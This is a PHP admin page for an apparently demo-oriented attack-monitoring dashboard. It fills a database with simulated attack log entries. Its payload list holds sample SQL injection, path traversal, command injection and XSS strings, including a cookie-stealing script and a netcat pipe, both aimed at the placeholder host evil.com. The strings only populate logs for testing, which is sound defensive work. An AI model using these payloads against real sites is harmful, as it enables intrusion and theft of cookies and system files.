<?php
// ============================================================
//  generate_attack.php — Generate random attack entries for demo
// ============================================================
session_start();
require_once __DIR__ . '/config/db.php';
require_once __DIR__ . '/includes/layout.php';
requireAuth();

// Sirf Admin access kar sakta hai
if ($_SESSION['user']['role'] !== 'admin') {
    header('Location: index.php?err=unauthorized');
    exit;
}

$db  = getDB();
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $count = min(100, max(1, (int)($_POST['count'] ?? 20)));

    // Sample data pools
    $ips = [
        '185.220.101.45','192.168.10.55','10.0.0.99','203.0.113.77',
        '172.16.5.22','185.234.219.5','91.108.4.18','198.51.100.42',
        '45.33.32.156','144.76.86.12','195.54.160.149','178.62.56.3',
        '5.188.206.26','185.220.100.240','209.141.38.200','162.216.149.1'
    ];

    $payloads = [
        // SQL Injection
        ["/search?q=' OR '1'='1--", "SQL Injection", "High"],
        ["/api/users?id=1 UNION SELECT username,password FROM users--", "SQL Injection", "High"],
        ["/admin?debug=1; DROP TABLE users--", "SQL Injection", "High"],
        ["/products?cat=1 AND SLEEP(5)--", "Blind SQL Injection", "High"],
        ["/login?user=admin'--&pass=x", "SQL Injection", "High"],

        // XSS
        ["/post?comment=<script>document.location='http://evil.com?c='+document.cookie</script>", "XSS", "High"],
        ["/search?q=<img src=x onerror=alert(1)>", "XSS", "Medium"],
        ["/profile?bio=javascript:alert('stored xss')", "XSS", "High"],
        ["/page?x=<svg onload=alert(document.domain)>", "XSS", "Medium"],

        // Path Traversal
        ["/download?file=../../../../etc/passwd", "Path Traversal", "High"],
        ["/view?path=..\\..\\..\\windows\\win.ini", "Path Traversal", "High"],
        ["/static/../../../etc/shadow", "Path Traversal", "High"],

        // Command Injection
        ["/ping?host=8.8.8.8; cat /etc/passwd", "Command Injection", "High"],
        ["/exec?cmd=ls -la | nc evil.com 4444", "Command Injection", "High"],
        ["/run?script=`whoami && id`", "Command Injection", "High"],

        // Brute Force
        ["/wp-login.php?log=admin&pwd=password123", "Brute Force", "Medium"],
        ["/admin/login?user=root&pass=toor", "Brute Force", "Medium"],
        ["/phpmyadmin/index.php", "Recon / Scan", "Low"],
        ["/admin/login?user=administrator&pass=admin", "Brute Force", "Medium"],

        // Code Injection
        ["/eval?code=base64_decode('cGhwaW5mbygpOw==')", "Code Injection", "High"],
        ["/api?callback=eval(atob('YWxlcnQoMSk='))", "Code Injection", "High"],

        // Scans
        ["/nmap-scan?target=192.168.0.0/24", "Port Scan", "Low"],
        ["/.env", "Information Disclosure", "Medium"],
        ["/server-status", "Recon / Scan", "Low"],
        ["/.git/config", "Information Disclosure", "Medium"],

        // sqlmap signature
        ["/products?id=1' AND 1=1-- sqlmap/1.7", "Automated Attack", "High"],
    ];

    $inserted = 0;
    $stmt     = $db->prepare(
        "INSERT INTO attack_logs (ip_address, request_url, attack_type, severity, detected_at) VALUES (?,?,?,?,?)"
    );

    for ($i = 0; $i < $count; $i++) {
        $ip      = $ips[array_rand($ips)];
        $payload = $payloads[array_rand($payloads)];
        // Random time in last 14 days
        $ts = date('Y-m-d H:i:s', time() - rand(0, 14 * 86400));

        if (!isBlocked($ip)) {
            $stmt->bind_param('sssss', $ip, $payload[0], $payload[1], $payload[2], $ts);
            $stmt->execute();
            autoBlockIfNeeded($ip);
            $inserted++;
        }
    }
    $stmt->close();

    $msg = '<div class="alert alert-success">⚡ Generated <strong>' . $inserted . '</strong> simulated attack entries successfully!</div>';
}

// ── Current counts ────────────────────────────────────────────
$total   = $db->query("SELECT COUNT(*) as c FROM attack_logs")->fetch_assoc()['c'];
$blocked = $db->query("SELECT COUNT(*) as c FROM blocked_ips")->fetch_assoc()['c'];

layout_start('Generate Attacks', 'generate');
?>

<div class="page-header">
  <div>
    <h2>⚡ Generate Simulated Attacks</h2>
    <p>Populate the database with random attack entries for demo &amp; testing</p>
  </div>
  <a href="index.php" class="btn btn-outline btn-sm">📊 View Dashboard</a>
</div>

<?= $msg ?>

<div style="display:grid;grid-template-columns:1fr 1.5fr;gap:1rem;">

  <!-- Generator Form -->
  <div class="card">
    <div class="card-header">
      <div class="card-title">🎲 Attack Simulator</div>
    </div>
    <div class="card-body">
      <form method="POST">
        <div class="form-group">
          <label>Number of Attacks to Generate (1–100)</label>
          <input type="number" name="count" class="form-control"
                 min="1" max="100" value="25" required>
        </div>
        <div style="background:rgba(233,69,96,.08);border:1px solid rgba(233,69,96,.2);
                    border-radius:8px;padding:1rem;margin-bottom:1rem;font-size:.85rem;">
          <strong style="color:var(--danger);">⚠️ Demo Only</strong><br>
          <span style="color:var(--text-muted);">
            This will insert simulated data into the database. Use for testing and presentations only.
          </span>
        </div>
        <button type="submit" class="btn btn-warning btn-block">
          ⚡ Generate Attacks Now
        </button>
      </form>

      <hr style="border:none;border-top:1px solid var(--border);margin:1.25rem 0;">

      <!-- Quick generate buttons -->
      <p style="font-size:.82rem;color:var(--text-muted);margin-bottom:.6rem;">Quick Generate:</p>
      <div style="display:flex;gap:.5rem;flex-wrap:wrap;">
        <?php foreach ([5,10,25,50,100] as $n): ?>
        <form method="POST" style="margin:0;">
          <input type="hidden" name="count" value="<?= $n ?>">
          <button type="submit" class="btn btn-outline btn-sm">+<?= $n ?></button>
        </form>
        <?php endforeach; ?>
      </div>
    </div>
  </div>

  <!-- Status & Attack Types -->
  <div>
    <!-- Current DB Stats -->
    <div class="stats-grid" style="grid-template-columns:1fr 1fr;margin-bottom:1rem;">
      <div class="stat-card total">
        <span class="stat-icon">🎯</span>
        <div class="stat-value"><?= $total ?></div>
        <div class="stat-label">Total Attack Logs</div>
      </div>
      <div class="stat-card blocked">
        <span class="stat-icon">🚫</span>
        <div class="stat-value"><?= $blocked ?></div>
        <div class="stat-label">IPs Auto-Blocked</div>
      </div>
    </div>

    <!-- Attack Types Reference -->
    <div class="card">
      <div class="card-header">
        <div class="card-title">📚 Simulated Attack Types</div>
      </div>
      <div class="card-body">
        <?php
        $types = [
            ["SQL Injection",         "High",   "Malicious SQL statements injected into queries"],
            ["Blind SQL Injection",   "High",   "Time-based/boolean blind SQLi via SLEEP()"],
            ["XSS",                   "High",   "Cross-site scripting payloads in parameters"],
            ["Path Traversal",        "High",   "Directory traversal to access system files"],
            ["Command Injection",     "High",   "OS command injection via vulnerable parameters"],
            ["Brute Force",           "Medium", "Credential stuffing against login endpoints"],
            ["Code Injection",        "High",   "PHP eval() / base64 obfuscated code injection"],
            ["Automated Attack",      "High",   "sqlmap automated exploitation attempts"],
            ["Recon / Scan",          "Low",    "Reconnaissance scans and probing"],
            ["Information Disclosure","Medium", "Access to sensitive config/git files"],
        ];
        foreach ($types as $t):
        ?>
        <div style="display:flex;align-items:center;gap:.75rem;padding:.5rem 0;border-bottom:1px solid var(--border);">
          <span class="badge badge-<?= strtolower($t[1]) ?>"><?= $t[1] ?></span>
          <div>
            <div style="font-size:.88rem;font-weight:600;"><?= $t[0] ?></div>
            <div style="font-size:.78rem;color:var(--text-muted);"><?= $t[2] ?></div>
          </div>
        </div>
        <?php endforeach; ?>
      </div>
    </div>

  </div>
</div>

<?php layout_end(); ?>
